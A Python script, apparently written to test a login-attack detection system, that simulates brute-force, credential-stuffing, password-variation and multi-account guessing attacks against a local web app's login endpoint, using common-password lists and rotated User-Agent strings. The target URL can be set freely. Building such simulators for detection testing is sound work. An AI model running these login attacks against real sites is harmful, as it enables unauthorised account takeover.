#!/usr/bin/env python3
"""
EaglePro Attack Simulator
Demo thực tế các loại tấn công để test hệ thống phát hiện
"""

import requests
import time
import random
import json
from datetime import datetime
import sys
import os

# Add project root to path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

class AttackSimulator:
    def __init__(self, base_url="http://localhost:5000"):
        self.base_url = base_url
        self.session = requests.Session()
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1"
        ]

    def get_random_user_agent(self):
        return random.choice(self.user_agents)

    def login_attempt(self, username, password, delay=0.1):
        """Thực hiện 1 login attempt"""
        if delay > 0:
            time.sleep(delay)

        headers = {
            'User-Agent': self.get_random_user_agent(),
            'Content-Type': 'application/x-www-form-urlencoded'
        }

        data = {
            'username': username,
            'password': password
        }

        try:
            response = self.session.post(
                f"{self.base_url}/login",
                data=data,
                headers=headers,
                allow_redirects=False
            )

            timestamp = datetime.now().strftime('%H:%M:%S')
            status = " SUCCESS" if response.status_code == 302 else " FAILED"

            print(f"[{timestamp}] Login: {username}/{password} - {status} ({response.status_code})")

            return response.status_code == 302  # Redirect means success

        except Exception as e:
            print(f" Error: {e}")
            return False

    def brute_force_attack(self, target_username="admin", password_list=None, attempts=20):
        """Demo Brute Force Attack"""
        print(" BRUTE FORCE ATTACK SIMULATION")
        print("=" * 50)
        print(f"Target: {target_username}")
        print(f"Attempts: {attempts}")
        print()

        if password_list is None:
            password_list = [
                "123456", "password", "123456789", "admin", "qwerty",
                "abc123", "password123", "admin123", "letmein", "welcome",
                "monkey", "1234567890", "iloveyou", "princess", "rockyou",
                "1234567", "12345678", "password1", "123123", "football"
            ]

        success_count = 0
        for i in range(attempts):
            password = random.choice(password_list)
            if self.login_attempt(target_username, password, delay=0.5):
                success_count += 1
                print(f" SUCCESS! Found password: {password}")
                break

        print(f"\n Brute Force Results: {success_count}/{attempts} successful logins")
        return success_count > 0

    def credential_stuffing_attack(self, credentials_list=None, attempts=15):
        """Demo Credential Stuffing Attack"""
        print("\n CREDENTIAL STUFFING ATTACK SIMULATION")
        print("=" * 50)
        print(f"Attempts: {attempts}")
        print()

        if credentials_list is None:
            credentials_list = [
                ("admin", "admin123"),
                ("user1", "password1"),
                ("test", "test123"),
                ("demo", "demo123"),
                ("guest", "guest123"),
                ("root", "root123"),
                ("administrator", "admin"),
                ("manager", "manager123"),
                ("support", "support123"),
                ("backup", "backup123")
            ]

        success_count = 0
        for i in range(attempts):
            username, password = random.choice(credentials_list)
            if self.login_attempt(username, password, delay=0.3):
                success_count += 1
                print(f" SUCCESS! Valid credentials: {username}/{password}")

        print(f"\n Credential Stuffing Results: {success_count}/{attempts} successful logins")
        return success_count > 0

    def rapid_brute_force_attack(self, target_username="admin", base_password="password", attempts=30):
        """Demo Rapid Brute Force (same password, different variations)"""
        print("\n RAPID BRUTE FORCE ATTACK SIMULATION")
        print("=" * 50)
        print(f"Target: {target_username}")
        print(f"Base password: {base_password}")
        print(f"Attempts: {attempts}")
        print()

        variations = [
            base_password,
            base_password + "1",
            base_password + "123",
            base_password + "!",
            "1" + base_password,
            base_password.upper(),
            base_password.capitalize(),
            base_password + "2024",
            base_password + "2023",
            base_password[::-1]  # reverse
        ]

        success_count = 0
        for i in range(attempts):
            password = random.choice(variations)
            if self.login_attempt(target_username, password, delay=0.1):  # Very fast
                success_count += 1
                print(f" SUCCESS! Password variation worked: {password}")
                break

        print(f"\n Rapid Brute Force Results: {success_count}/{attempts} successful logins")
        return success_count > 0

    def distributed_attack_simulation(self, num_ips=5, attempts_per_ip=10):
        """Demo Distributed Attack (multiple IPs)"""
        print("\n DISTRIBUTED ATTACK SIMULATION")
        print("=" * 50)
        print(f"Simulated IPs: {num_ips}")
        print(f"Attempts per IP: {attempts_per_ip}")
        print()

        # Simulate different IP addresses by changing headers
        base_ip = "192.168.1."
        passwords = ["password", "123456", "admin", "letmein"]

        total_attempts = 0
        total_success = 0

        for ip_num in range(1, num_ips + 1):
            ip = f"{base_ip}{ip_num}"
            print(f" Attacking from IP: {ip}")

            for attempt in range(attempts_per_ip):
                username = f"user{ip_num}"
                password = random.choice(passwords)

                # Note: In real distributed attack, each IP would be different source
                # Here we just simulate the pattern
                if self.login_attempt(username, password, delay=0.2):
                    total_success += 1
                total_attempts += 1

        print(f"\n Distributed Attack Results: {total_success}/{total_attempts} successful logins")
        return total_success > 0

    def run_full_demo(self):
        """Chạy full demo với tất cả loại attacks"""
        print(" EaglePro Attack Simulator - FULL DEMO")
        print("=" * 60)
        print("  Đảm bảo web app đang chạy trên http://localhost:5000")
        print(" Khởi động: python web_app/app_complete.py")
        print("=" * 60)

        # Test connection first
        try:
            response = requests.get(f"{self.base_url}/", timeout=5)
            print(f" Web app reachable: {response.status_code}")
        except Exception as e:
            print(f" Cannot connect to web app: {e}")
            print(" Please start the web app first!")
            return

        print("\n Starting attack simulations...\n")

        # Run different attack types
        self.brute_force_attack()
        self.credential_stuffing_attack()
        self.rapid_brute_force_attack()
        self.distributed_attack_simulation()

        print("\n Demo completed!")
        print(" Check logs with: python scripts/extract_logs.py")
        print(" Check web interface: http://localhost:5000/admin")

def main():
    import argparse

    parser = argparse.ArgumentParser(description="EaglePro Attack Simulator")
    parser.add_argument("--url", default="http://localhost:5000", help="Web app URL")
    parser.add_argument("--attack", choices=["brute", "stuffing", "rapid", "distributed", "full"],
                       default="full", help="Attack type to simulate")

    args = parser.parse_args()

    simulator = AttackSimulator(args.url)

    if args.attack == "brute":
        simulator.brute_force_attack()
    elif args.attack == "stuffing":
        simulator.credential_stuffing_attack()
    elif args.attack == "rapid":
        simulator.rapid_brute_force_attack()
    elif args.attack == "distributed":
        simulator.distributed_attack_simulation()
    else:
        simulator.run_full_demo()

if __name__ == "__main__":
    main()